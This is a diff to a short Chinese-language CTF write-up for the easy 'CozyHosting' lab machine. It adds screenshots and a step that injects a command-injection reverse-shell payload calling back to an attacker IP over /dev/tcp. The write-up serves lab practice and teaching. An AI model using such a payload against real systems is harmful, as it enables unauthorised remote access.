@@ -1,4 +1,4 @@
-CozyHosting Level:Easy
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/ca53d48d-8c3e-4d90-9c0b-5992be7d2797)CozyHosting Level:Easy
 ===
 尋找user.txt
 ---
@@ -20,3 +20,8 @@ CozyHosting Level:Easy
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/f05c4cc3-a6d0-4d1f-bfd4-33d3ab5bcc4e)
 
+5.插入reverse shell取得shell
+
+     ;`(sh)0>/dev/tcp/10.10.14.62/1234`    
+ 
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/eb0de815-97af-4104-bfd9-5ccb5aea6225)
